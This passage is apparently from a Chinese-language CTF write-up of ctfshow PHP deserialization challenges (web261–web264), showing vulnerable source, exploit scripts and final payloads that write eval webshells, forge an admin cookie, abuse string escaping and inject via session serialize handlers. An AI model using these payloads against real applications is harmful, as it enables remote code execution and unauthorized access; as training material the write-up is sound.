class="string">&#x27;password&#x27;</span>];</span><br><span class="line">		<span class="variable language_">$this</span>-&gt;code = <span class="variable language_">$this</span>-&gt;username.<span class="variable language_">$this</span>-&gt;password;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">		<span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;code==<span class="number">0x36d</span>)&#123;</span><br><span class="line">			<span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$this</span>-&gt;username, <span class="variable">$this</span>-&gt;password);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;vip&#x27;</span>]);</span><br></pre></td></tr></table></figure>

<p>å½“ååºåˆ—åŒ–æ—¶ä¼šè¿›å…¥<code>__unserialize</code>ä¸­ï¼Œè€Œä¸”<code>__invoke</code>æ— æ³•åˆ©ç”¨ï¼Œæ•…ç›´æ¥å†™ğŸã€‚<code>0x3d</code>æ˜¯å¼±ç±»å‹æ¯”è¾ƒã€‚</p>
<p>ç¼–å†™<code>exp</code></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfshowvip</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$code</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">    	<span class="variable language_">$this</span>-&gt;username = <span class="string">&#x27;877.php&#x27;</span>;</span><br><span class="line">    	<span class="variable language_">$this</span>-&gt;password = <span class="string">&#x27;&lt;?php eval($_POST[a]);?&gt;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">ctfshowvip</span>();</span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>)));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>æœ€ç»ˆ<code>payload</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/?vip=O%3A10%3A%22ctfshowvip%22%3A3%3A%7Bs%3A8%3A%22username%22%3Bs%3A7%3A%22877.php%22%3Bs%3A8%3A%22password%22%3Bs%3A24%3A%22%3C%3Fphp+eval%28%24_POST%5Ba%5D%29%3B%3F%3E%22%3Bs%3A4%3A%22code%22%3BN%3B%7D</span><br></pre></td></tr></table></figure>

<p>ç„¶ååˆ©ç”¨<code>877.php</code>å³å¯</p>
<h2 id="web262"><a href="#web262" class="headerlink" title="web262"></a>web262</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-12-03 02:37:19</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-12-03 16:05:38</span></span><br><span class="line"><span class="comment"># <span class="doctag">@message</span>.php</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">message</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$from</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$msg</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$to</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$token</span>=<span class="string">&#x27;user&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$f</span>,<span class="variable">$m</span>,<span class="variable">$t</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="keyword">from</span> = <span class="variable">$f</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;msg = <span class="variable">$m</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;to = <span class="variable">$t</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$f</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;f&#x27;</span>];</span><br><span class="line"><span class="variable">$m</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;m&#x27;</span>];</span><br><span class="line"><span class="variable">$t</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;t&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$f</span>) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$m</span>) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$t</span>))&#123;</span><br><span class="line">    <span class="variable">$msg</span> = <span class="keyword">new</span> <span class="title function_ invoke__">message</span>(<span class="variable">$f</span>,<span class="variable">$m</span>,<span class="variable">$t</span>);</span><br><span class="line">    <span class="variable">$umsg</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;fuck&#x27;</span>, <span class="string">&#x27;loveU&#x27;</span>, <span class="title function_ invoke__">serialize</span>(<span class="variable">$msg</span>));</span><br><span class="line">    <span class="title function_ invoke__">setcookie</span>(<span class="string">&#x27;msg&#x27;</span>,<span class="title function_ invoke__">base64_encode</span>(<span class="variable">$umsg</span>));</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;Your message has been sent&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure>

<p><strong>message.php</strong></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">message</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$from</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$msg</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$to</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$token</span>=<span class="string">&#x27;user&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$f</span>,<span class="variable">$m</span>,<span class="variable">$t</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="keyword">from</span> = <span class="variable">$f</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;msg = <span class="variable">$m</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;to = <span class="variable">$t</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;msg&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$msg</span> = <span class="title function_ invoke__">unserialize</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;msg&#x27;</span>]));</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$msg</span>-&gt;token==<span class="string">&#x27;admin&#x27;</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>è®¾ç½®<code>Cookie</code>ä¸­çš„<code>msg</code>å­—æ®µï¼Œä½¿<code>token=admin</code>å³å¯</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">message</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$from</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$msg</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$to</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$token</span>=<span class="string">&#x27;admin&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="keyword">from</span> = <span class="variable">$f</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;msg = <span class="variable">$m</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;to = <span class="variable">$t</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">message</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>ç›´æ¥æ‰“<code>message.php</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/message.php</span><br><span class="line">Cookie:</span><br><span class="line">msg=Tzo3OiJtZXNzYWdlIjo0OntzOjQ6ImZyb20iO047czozOiJtc2ciO047czoyOiJ0byI7TjtzOjU6InRva2VuIjtzOjU6ImFkbWluIjt9</span><br></pre></td></tr></table></figure>

<p>ä¹Ÿå¯ä»¥åˆ©ç”¨å­—ç¬¦ä¸²é€ƒé€¸</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">message</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$from</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$msg</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$to</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$token</span>=<span class="string">&#x27;user&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$str</span> = <span class="string">&#x27;&quot;;s:5:&quot;token&quot;;s:5:&quot;admin&quot;;&#125;&#x27;</span>;</span><br><span class="line"><span class="variable">$len</span> = <span class="title function_ invoke__">strlen</span>(<span class="variable">$str</span>);</span><br><span class="line"><span class="variable">$s</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$len</span>; <span class="variable">$i</span>++) &#123; </span><br><span class="line">    <span class="variable">$s</span> = <span class="variable">$s</span>.<span class="string">&#x27;fuck&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$s</span> = <span class="variable">$s</span>.<span class="variable">$str</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$s</span>.PHP_EOL;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">message</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;to = <span class="variable">$s</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>).PHP_EOL;</span><br><span class="line"><span class="variable">$umsg</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;fuck&#x27;</span>, <span class="string">&#x27;loveU&#x27;</span>, <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$umsg</span>.PHP_EOL;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>æ¯æ¬¡æ›¿æ¢ä¼šç»™å‡ºä¸€ä¸ªå­—ç¬¦çš„ç©ºï¼Œè€Œè¦ä½¿å¾—<code>token=admin</code>å°±éœ€è¦å°¾éƒ¨æ‹¼æ¥ä¸Š<code>&quot;;s:5:&quot;token&quot;;s:5:&quot;admin&quot;;&#125;</code>ï¼Œæ€»å…±éœ€è¦<code>27</code>ä¸ªå­—ç¬¦çš„ç©ºé—´ï¼Œæ•…æ‹¼æ¥<code>27</code>ä¸ª<code>fuck</code>è®©å®ƒè¢«æ›¿æ¢å°±å¯ä»¥äº†</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/?f=1&amp;m=1&amp;t=fuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuck&quot;;s:5:&quot;token&quot;;s:5:&quot;admin&quot;;&#125;</span><br></pre></td></tr></table></figure>

<h2 id="web263"><a href="#web263" class="headerlink" title="web263"></a>web263</h2><p>è®¿é—®<code>www.zip</code>è·å¾—æºç å‹ç¼©åŒ…ï¼Œä¸‹é¢æ˜¯å…³é”®æ–‡ä»¶ä»£ç </p>
<p><code>index.php</code>ï¼Œè¿™é‡Œè¦æ³¨æ„å®ƒçš„<code>limit</code>å†™æˆäº†<code>limti</code>ï¼Œæ‰€ä»¥ä¸ä¼šè¶…è¿‡é™åˆ¶</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">	error_reporting(0);</span><br><span class="line">	session_start();</span><br><span class="line">	//è¶…è¿‡5æ¬¡ç¦æ­¢ç™»é™†</span><br><span class="line">	if(isset($_SESSION[&#x27;limit&#x27;]))&#123;</span><br><span class="line">		$_SESSION[&#x27;limti&#x27;]&gt;5?die(&quot;ç™»é™†å¤±è´¥æ¬¡æ•°è¶…è¿‡é™åˆ¶&quot;):$_SESSION[&#x27;limit&#x27;]=base64_decode($_COOKIE[&#x27;limit&#x27;]);</span><br><span class="line">		$_COOKIE[&#x27;limit&#x27;] = base64_encode(base64_decode($_COOKIE[&#x27;limit&#x27;]) +1);</span><br><span class="line">	&#125;else&#123;</span><br><span class="line">		 setcookie(&quot;limit&quot;,base64_encode(&#x27;1&#x27;));</span><br><span class="line">		 $_SESSION[&#x27;limit&#x27;]= 1;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">	&lt;meta charset=&quot;UTF-8&quot;&gt;</span><br><span class="line">	&lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;IE=edge&quot;&gt;</span><br><span class="line">	&lt;meta name=&quot;viewport&quot; content=&quot;initial-scale=1,maximum-scale=1, minimum-scale=1&quot;&gt;</span><br><span class="line">	&lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1&quot;&gt;</span><br><span class="line">	&lt;meta name=&quot;apple-mobile-web-app-capable&quot; content=&quot;yes&quot;&gt;</span><br><span class="line">	&lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no&quot;&gt;</span><br><span class="line">	&lt;title&gt;ctfshowç™»é™†&lt;/title&gt;</span><br><span class="line">	&lt;link href=&quot;css/style.css&quot; rel=&quot;stylesheet&quot;&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line"></span><br><span class="line">	&lt;div class=&quot;pc-kk-form&quot;&gt;</span><br><span class="line">		&lt;center&gt;&lt;h1&gt;CTFshow ç™»é™†&lt;/h1&gt;&lt;/center&gt;&lt;br&gt;&lt;br&gt;</span><br><span class="line">		&lt;form action=&quot;&quot; onsubmit=&quot;return false;&quot;&gt;</span><br><span class="line">			&lt;div class=&quot;pc-kk-form-list&quot;&gt;</span><br><span class="line">				&lt;input id=&quot;u&quot; type=&quot;text&quot; placeholder=&quot;ç”¨æˆ·å&quot;&gt;</span><br><span class="line">			&lt;/div&gt;</span><br><span class="line">			&lt;div class=&quot;pc-kk-form-list&quot;&gt;</span><br><span class="line">				&lt;input id=&quot;pass&quot; type=&quot;password&quot; placeholder=&quot;å¯†ç &quot;&gt;</span><br><span class="line">			&lt;/div&gt;</span><br><span class="line">			</span><br><span class="line">			&lt;div class=&quot;pc-kk-form-btn&quot;&gt;</span><br><span class="line">				&lt;button onclick=&quot;check();&quot;&gt;ç™»é™†&lt;/button&gt;</span><br><span class="line">			&lt;/div&gt;</span><br><span class="line">		&lt;/form&gt;</span><br><span class="line">	&lt;/div&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	&lt;script type=&quot;text/javascript&quot; src=&quot;js/jquery.min.js&quot;&gt;&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">	&lt;script&gt;</span><br><span class="line"></span><br><span class="line">		function check()&#123;</span><br><span class="line">			$.ajax(&#123;</span><br><span class="line">			url:&#x27;check.php&#x27;,</span><br><span class="line">			type: &#x27;GET&#x27;,</span><br><span class="line">			data:&#123;</span><br><span class="line">				&#x27;u&#x27;:$(&#x27;#u&#x27;).val(),</span><br><span class="line">				&#x27;pass&#x27;:$(&#x27;#pass&#x27;).val()</span><br><span class="line">			&#125;,</span><br><span class="line">			success:function(data)&#123;</span><br><span class="line">				alert(JSON.parse(data).msg);</span><br><span class="line">			&#125;,</span><br><span class="line">			error:function(data)&#123;</span><br><span class="line">				alert(JSON.parse(data).msg);</span><br><span class="line">			&#125;</span><br><span class="line"></span><br><span class="line">		&#125;);</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<p><strong>check.php</strong></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-09-03 16:59:10</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-09-06 19:15:38</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">require_once</span> <span class="string">&#x27;inc/inc.php&#x27;</span>;</span><br><span class="line"><span class="variable">$GET</span> = <span class="keyword">array</span>(<span class="string">&quot;u&quot;</span>=&gt;<span class="variable">$_GET</span>[<span class="string">&#x27;u&#x27;</span>],<span class="string">&quot;pass&quot;</span>=&gt;<span class="variable">$_GET</span>[<span class="string">&#x27;pass&#x27;</span>]);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$GET</span>)&#123;</span><br><span class="line"></span><br><span class="line">	<span class="variable">$data</span>= <span class="variable">$db</span>-&gt;<span class="title function_ invoke__">get</span>(<span class="string">&#x27;admin&#x27;</span>,</span><br><span class="line">	[	<span class="string">&#x27;id&#x27;</span>,</span><br><span class="line">		<span class="string">&#x27;UserName0&#x27;</span></span><br><span class="line">	],[</span><br><span class="line">		<span class="string">&quot;AND&quot;</span>=&gt;[</span><br><span class="line">		<span class="string">&quot;UserName0[=]&quot;</span>=&gt;<span class="variable">$GET</span>[<span class="string">&#x27;u&#x27;</span>],</span><br><span class="line">		<span class="string">&quot;PassWord1[=]&quot;</span>=&gt;<span class="variable">$GET</span>[<span class="string">&#x27;pass&#x27;</span>] //å¯†ç å¿…é¡»ä¸º<span class="number">128</span>ä½å¤§å°å†™å­—æ¯+æ•°å­—+ç‰¹æ®Šç¬¦å·ï¼Œé˜²æ­¢çˆ†ç ´</span><br><span class="line">		]</span><br><span class="line">	]);</span><br><span class="line">	<span class="keyword">if</span>(<span class="variable">$data</span>[<span class="string">&#x27;id&#x27;</span>])&#123;</span><br><span class="line">		<span class="comment">//ç™»é™†æˆåŠŸå–æ¶ˆæ¬¡æ•°ç´¯è®¡</span></span><br><span class="line">		<span class="variable">$_SESSION</span>[<span class="string">&#x27;limit&#x27;</span>]= <span class="number">0</span>;</span><br><span class="line">		<span class="keyword">echo</span> <span class="title function_ invoke__">json_encode</span>(<span class="keyword">array</span>(<span class="string">&quot;success&quot;</span>,<span class="string">&quot;msg&quot;</span>=&gt;<span class="string">&quot;æ¬¢è¿æ‚¨&quot;</span>.<span class="variable">$data</span>[<span class="string">&#x27;UserName0&#x27;</span>]));</span><br><span class="line">	&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">		<span class="comment">//ç™»é™†å¤±è´¥ç´¯è®¡æ¬¡æ•°åŠ 1</span></span><br><span class="line">		<span class="variable">$_COOKIE</span>[<span class="string">&#x27;limit&#x27;</span>] = <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;limit&#x27;</span>])+<span class="number">1</span>);</span><br><span class="line">		<span class="keyword">echo</span> <span class="title function_ invoke__">json_encode</span>(<span class="keyword">array</span>(<span class="string">&quot;error&quot;</span>,<span class="string">&quot;msg&quot;</span>=&gt;<span class="string">&quot;ç™»é™†å¤±è´¥&quot;</span>));</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>inc.php</code>åªè´´éƒ¨åˆ†æ¯”è¾ƒå…³é”®çš„ä»£ç ï¼Œå¯ä»¥çœ‹åˆ°ä½¿ç”¨äº†<code>session.serialize_handler</code>ï¼Œ<code>User</code>ç±»ææ„å‡½æ•°å¯ä»¥åˆ©ç”¨å†™ğŸ</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;session.serialize_handler&#x27;</span>, <span class="string">&#x27;php&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$status</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$username</span>,<span class="variable">$password</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;username = <span class="variable">$username</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;password = <span class="variable">$password</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">setStatus</span>(<span class="params"><span class="variable">$s</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;status=<span class="variable">$s</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">file_put_contents</span>(<span class="string">&quot;log-&quot;</span>.<span class="variable">$this</span>-&gt;username, <span class="string">&quot;ä½¿ç”¨&quot;</span>.<span class="variable">$this</span>-&gt;password.<span class="string">&quot;ç™»é™†&quot;</span>.(<span class="variable">$this</span>-&gt;status?<span class="string">&quot;æˆåŠŸ&quot;</span>:<span class="string">&quot;å¤±è´¥&quot;</span>).<span class="string">&quot;----&quot;</span>.<span class="title function_ invoke__">date_create</span>()-&gt;<span class="title function_ invoke__">format</span>(<span class="string">&#x27;Y-m-d H:i:s&#x27;</span>));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>session</code>ååºåˆ—åŒ–ï¼Œç”Ÿæˆå¸¦<code>|</code>åºåˆ—åŒ–æ–‡æœ¬å†™å…¥<code>shell</code>å³å¯</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$status</span> = <span class="string">&#x27;1&#x27;</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$username</span>,<span class="variable">$password</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;username = <span class="variable">$username</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;password = <span class="variable">$password</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">User</span>(<span class="string">&#x27;1.php&#x27;</span>, <span class="string">&#x27;&lt;?php eval($_GET[&quot;a&quot;]);phpinfo();?&gt;&#x27;</span>);</span><br><span class="line"><span class="comment">// echo &#x27;|&#x27;.serialize($a).PHP_EOL;</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">base64_encode</span>(<span class="string">&#x27;|&#x27;</span>.<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>ä¿®æ”¹<code>Cookie</code>è®¿é—®<code>index.php</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">fE86NDoiVXNlciI6Mzp7czo4OiJ1c2VybmFtZSI7czo1OiIxLnBocCI7czo4OiJwYXNzd29yZCI7czozNToiPD9waHAgZXZhbCgkX0dFVFsiYSJdKTtwaHBpbmZvKCk7Pz4iO3M6Njoic3RhdHVzIjtzOjE6IjEiO30=</span><br></pre></td></tr></table></figure>

<p>ç„¶åè®¿é—®<code>check.php</code>ç”ŸæˆğŸ</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/check.php?u=admin&amp;pass=admin</span><br></pre></td></tr></table></figure>

<p>æœ€ç»ˆç›´æ¥æ‰“<code>log-1.php</code>å³å¯</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/log-1.php?a=system(%27tac%20flag.php%27);</span><br></pre></td></tr></table></figure>

<h2 id="web264"><a href="#web264" class="headerlink" title="web264"></a>web264</h2><p><strong>index.php</strong></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">message</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$from</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$msg</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$to</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$token</span>=<span class="string">&#x27;user&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$f</span>,<span class="variable">$m</span>,<span class="variable">$t</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="keyword">from</span> = <span class="variable">$f</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;msg = <span class="variable">$m</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;to = <span class="variable">$t</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$f</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;f&#x27;</span>];</span><br><span class="line"><span class="variable">$m</span> = <span 